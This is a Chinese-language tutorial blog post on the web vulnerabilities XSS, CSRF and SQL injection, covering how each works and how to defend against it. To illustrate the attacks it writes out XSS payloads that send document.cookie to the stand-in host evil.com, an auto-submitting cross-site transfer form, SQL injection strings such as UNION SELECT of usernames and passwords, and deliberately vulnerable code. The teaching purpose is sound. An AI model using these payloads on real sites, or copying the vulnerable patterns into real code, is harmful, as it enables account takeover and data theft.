---
title: Web 安全基础：XSS、CSRF、SQL 注入防御
published: 2026-09-02
description: '从原理到防御，用可运行的例子讲透 Web 三大经典漏洞：XSS、CSRF 与 SQL 注入，并给出每条防线的实战代码与加固清单。'
image: ''
tags: [Web安全, XSS, CSRF, SQL注入, 互联网]
category: '互联网'
draft: false
lang: ''
---

## 引言：为什么这三类漏洞几十年了还在发生

根据 OWASP 每几年更新一次的 Top 10 榜单，注入类（Injection）、跨站脚本（XSS）和失效的访问控制一直是雷打不动的「常驻嘉宾」。它们的共同点是：**原理简单到用三行代码就能演示，但要根治却需要贯穿整个开发流程的工程纪律**。

这篇文章把这三类漏洞放在一起讲，不是为了罗列知识，而是因为它们共享同一条底层逻辑：**永远不要信任来自客户端的数据**。无论是渲染进 HTML、拼接进 SQL，还是跨请求携带的凭证，只要把「用户可控的输入」当成了「可信的数据」，漏洞就埋下了。

## 1. XSS：把脚本塞进别人的页面

XSS（Cross-Site Scripting，跨站脚本）的本质是：攻击者把恶意脚本注入到网页里，让它在其他用户浏览时执行。按注入方式不同，分为三类。

### 1. 反射型 XSS

服务端把请求参数原样回显到页面，且没有转义。典型场景是一个搜索框：

```html
<!-- 服务端模板，直接回显 q 参数 -->
<div>搜索结果：<?php echo $_GET['q']; ?></div>
```

攻击者构造这样的链接发给受害者：

```
https://example.com/search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
```

用户点击后，脚本在 `example.com` 的源下执行，直接读取并外传 Cookie。因为是「请求→立即回显」，所以叫反射型。

### 2. 存储型 XSS

恶意脚本被持久化到数据库，之后每个访问该页面的用户都会中招。典型场景是留言板或评论区：

```js
// 假设评论区直接把用户输入存入数据库，渲染时原样输出
function renderComment(comment) {
  // 危险！comment.text 可能包含 <script> 标签
  return `<div class="comment">${comment.text}</div>`;
}
```

攻击者发一条「评论」，内容是 `<script>document.location='https://evil.com/?c='+document.cookie</script>`，之后所有浏览该评论区的人都会被执行脚本。存储型 XSS 的危害比反射型大得多，因为它不需要逐个「钓鱼」，一条评论就能打穿所有访客。

### 3. DOM 型 XSS

这类漏洞不经过服务端，纯粹发生在浏览器端——JavaScript 把不可信数据写进了 `innerHTML`、`document.write` 或 `eval`：

```js
// 从 URL hash 读取并直接渲染，危险
const user = location.hash.slice(1);
document.getElementById('welcome').innerHTML = `欢迎，${user}`;
```

访问 `https://example.com/#<img src=x onerror=alert(1)>` 就会触发脚本。DOM 型 XSS 特别隐蔽，因为它绕过了服务端的 WAF——恶意数据根本没离开浏览器。

### XSS 的防御

防御 XSS 的核心是**「按上下文转义」**，并且尽量让数据永远不变成可执行的代码：

```js
// 1. 输出到 HTML 文本时，转义关键字符
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// 2. 现代框架（React/Vue）默认转义文本插值，但危险 API 依然存在
//    不要这样做：
element.innerHTML = userInput;
//    而是用 textContent，它只当作纯文本处理：
element.textContent = userInput;
```

再加上两道纵深防线：

- **CSP（内容安全策略）**：通过 HTTP 响应头限制脚本来源，即使被注入也跑不起来。

```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

- **富文本场景用白名单过滤**：如果必须允许用户提交 HTML（如 Markdown 渲染），用 DOMPurify 这类白名单清洗库，而不是自己写黑名单正则。

## 2. CSRF：借你的身份干坏事

CSRF（Cross-Site Request Forgery，跨站请求伪造）不偷你的数据，而是**利用你已经登录的状态，让浏览器替你发起一个你并不知情的请求**。它的前提是：浏览器默认会带上目标站点的 Cookie。

### 攻击原理

假设银行转账接口长这样：

```
POST https://bank.com/transfer
body: { to: 'attacker', amount: 10000 }
```

只要用户登录了 `bank.com`（Cookie 有效），攻击者在自己的网站上放一个自动提交的表单：

```html
<!-- 放在 evil.com 上的页面，用户一访问就自动提交 -->
<form action="https://bank.com/transfer" method="POST" style="display:none">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

用户访问 `evil.com` 时，浏览器带上 `bank.com` 的 Cookie 向 `bank.com` 发起 POST——对服务端来说，这就是一次「已登录用户的合法请求」。**CSRF 的本质是：浏览器无法区分一个请求是用户主动发出的，还是被第三方页面「夹带」的。**

### CSRF 的防御

现代防御主要靠三条线，它们可以组合使用：

```js
// 1. CSRF Token：服务端生成随机 token，前端每次请求携带
// 攻击者无法读取这个 token（同源策略），所以伪造不了请求
// 服务端（伪代码）：
app.get('/form', (req, res) => {
  const token = crypto.randomBytes(32).toString('hex');
  req.session.csrfToken = token;
  res.render('form', { csrfToken: token });
});
app.post('/transfer', (req, res) => {
  if (req.body.csrfToken !== req.session.csrfToken) {
    return res.status(403).send('Invalid CSRF token');
  }
  // 校验通过才执行转账
});

// 2. SameSite Cookie：限制 Cookie 只在同站请求时携带
// Set-Cookie: sessionId=abc; SameSite=Lax  （或 Strict）
```

`SameSite=Lax` 允许「顶级导航」携带 Cookie（比如从搜索结果点进网站），但阻止跨站的 POST 表单和 `fetch` 携带，几乎不影响正常使用，是最省事的一道防线。再配合校验 `Origin`/`Referer` 头，基本能覆盖绝大多数 CSRF 场景。

## 3. SQL 注入：拼字符串的代价

SQL 注入（SQL Injection）是注入类漏洞的代表：攻击者把恶意 SQL 片段拼进查询语句，从而读库、改库甚至拖库。

### 攻击原理

下面这段代码把用户名直接拼进了查询：

```js
// 危险！直接拼接用户输入
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
db.query(query);
```

如果攻击者在用户名输入框里填：

```
' OR '1'='1' -- 
```

拼接后的 SQL 变成：

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = ''
```

`--` 后面的内容被当作注释，`OR '1'='1'` 恒为真，于是攻击者**不需要密码就能登录任意账号**。更严重的变体是联合查询和堆叠查询，可以直接读出整张表：

```
' UNION SELECT username, password FROM users -- 
```

### SQL 注入的防御

防御 SQL 注入有一条铁律：**永远不要把用户输入拼进 SQL，一律使用参数化查询（预处理语句）**。

```js
// 正确：参数化查询，用户输入永远被当作「数据」而非「代码」
const stmt = db.prepare(
  'SELECT * FROM users WHERE username = ? AND password = ?'
);
stmt.run(username, password);
```

参数化查询的原理是：SQL 语句的结构先被数据库解析、编译好，参数只是「填充」到占位符里，无论参数里写什么，都不可能改变 SQL 的语法结构。对于无法参数化的场景（比如需要动态指定列名或排序字段），则用**白名单**校验，而不是转义。

```js
// 动态排序字段：只允许白名单内的列名
const ALLOWED_COLUMNS = ['id', 'created_at', 'score'];
const orderBy = ALLOWED_COLUMNS.includes(req.query.sort)
  ? req.query.sort
  : 'id';
```

## 结语：三条防线背后的同一句话

把 XSS、CSRF、SQL 注入放在一起看，会发现它们的防御都指向同一条原则：

| 漏洞 | 信任了什么 | 防御方式 |
|------|-----------|---------|
| XSS | 用户输入可以安全地变成 HTML | 转义 / textContent / CSP |
| CSRF | 浏览器带 Cookie 的请求都是用户本意 | CSRF Token / SameSite / Origin 校验 |
| SQL 注入 | 用户输入可以安全地拼进 SQL | 参数化查询 / 白名单 |

安全从来不是一个「功能」，而是一层贯穿始终的工程习惯。落地到日常开发里，只需要记住三件小事：**渲染用 textContent 而不是 innerHTML，跨站请求加 SameSite 和 CSRF Token，查数据库永远走参数化查询**。做到这三点，就已经堵住了绝大多数入门级的攻击面。

---

## 参考来源

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [MDN — Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [MDN — SameSite cookies explained](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value)
- [DOMPurify — DOM 清洗库](https://github.com/cure53/DOMPurify)
